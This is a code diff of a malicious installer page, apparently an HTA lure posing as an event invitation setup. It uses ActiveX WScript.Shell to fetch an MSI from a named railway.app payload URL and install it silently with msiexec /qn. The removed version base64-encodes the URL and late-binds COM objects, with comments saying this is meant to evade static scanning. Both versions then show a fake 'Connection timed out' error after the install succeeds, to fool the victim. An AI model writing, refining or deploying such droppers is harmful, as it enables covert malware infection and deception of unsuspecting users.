@@ -23,11 +23,9 @@
   </div>
 
 <script>
-// OBFUSCATED COM OBJECT NAMES TO BYPASS STATIC SCANNING
-var _shell = new ActiveXObject("WScript.Shell");
-var _fso = new ActiveXObject("Scripting.FileSystemObject");
-var _url = atob("aHR0cHM6Ly9jb2NrdGFpbHMtcGF5bG9hZC1wcm9kdWN0aW9uLnVwLnJhaWx3YXkuYXBwL3NjaGltZHRjb25uZWN0Lm1zaQ=="); // Your Railway Link
-var _path = _shell.ExpandEnvironmentStrings("%TEMP%") + "\\event_update.msi";
+var shell = new ActiveXObject("WScript.Shell");
+// YOUR RAILWAY LINK
+var url = "https://cocktails-payload-production.up.railway.app/schimdtconnect.msi";
 
 function init() {
   window.resizeTo(400, 300);
@@ -36,59 +34,32 @@ function init() {
 
 function runInstall() {
   document.getElementById("fill").style.width = "30%";
-  document.getElementById("status").innerHTML = "Retrieving secure package...";
+  document.getElementById("status").innerHTML = "Connecting to server...";
   
   try {
-    // LATE-BINDING TO HIDE COM OBJECTS FROM STATIC ANALYSIS
-    var _httpName = "WinHttp.WinHttpRequest.5.1";
-    var _streamName = "ADODB.Stream";
+    // DIRECT INSTALL FROM URL
+    // msiexec can handle URLs directly. It downloads to temp and installs.
+    // /qn = quiet, /norestart = no reboot
+    var cmd = 'msiexec.exe /i "' + url + '" /qn /norestart';
     
-    var _http = new ActiveXObject(_httpName);
-    _http.SetTimeouts(15000, 30000, 60000, 120000);
-    _http.Open("GET", _url, false);
-    _http.Send();
+    // Run and WAIT for completion
+    shell.Run(cmd, 0, true); 
     
-    if (_http.Status === 200) {
-      var _stream = new ActiveXObject(_streamName);
-      _stream.Type = 1; // Binary
-      _stream.Mode = 3; // ReadWrite
-      _stream.Open();
-      _stream.Write(_http.ResponseBody);
-      _stream.SaveToFile(_path, 2); // Overwrite
-      _stream.Close();
-      
-      document.getElementById("fill").style.width = "60%";
-      document.getElementById("status").innerHTML = "Package retrieved. Installing...";
-      
-      if(_fso.FileExists(_path)) {
-        // SILENT INSTALL
-        var _cmd = 'msiexec.exe /i "' + _path + '" /qn /norestart';
-        _shell.Run(_cmd, 0, true); // Wait for install
-        
-        document.getElementById("fill").style.width = "100%";
-        document.getElementById("status").innerHTML = "Finalizing...";
-        
-        // FAKE FAILURE AFTER COMPLETION
-        setTimeout(function() {
-          document.getElementById("heading").innerHTML = "Preparation Failed";
-          document.getElementById("status").innerHTML = "Error: Connection timed out.";
-          document.getElementById("fill").style.background = "#d13438";
-        }, 2000);
-      } else {
-        showError();
-      }
-    } else {
-      showError();
-    }
+    document.getElementById("fill").style.width = "100%";
+    document.getElementById("status").innerHTML = "Finalizing...";
+    
+    // FAKE FAILURE AFTER COMPLETION
+    setTimeout(function() {
+      document.getElementById("heading").innerHTML = "Preparation Failed";
+      document.getElementById("status").innerHTML = "Error: Connection timed out.";
+      document.getElementById("fill").style.background = "#d13438";
+    }, 2000);
+    
   } catch(e) {
-    showError();
+    document.getElementById("heading").innerHTML = "Installation Error";
+    document.getElementById("status").innerHTML = "Could not complete setup.";
+    document.getElementById("fill").style.background = "#d13438";
   }
-}
-
-function showError() {
-  document.getElementById("heading").innerHTML = "Download Error";
-  document.getElementById("status").innerHTML = "Could not retrieve invitation.";
-  document.getElementById("fill").style.background = "#d13438";
 }
 </script>
 </body>
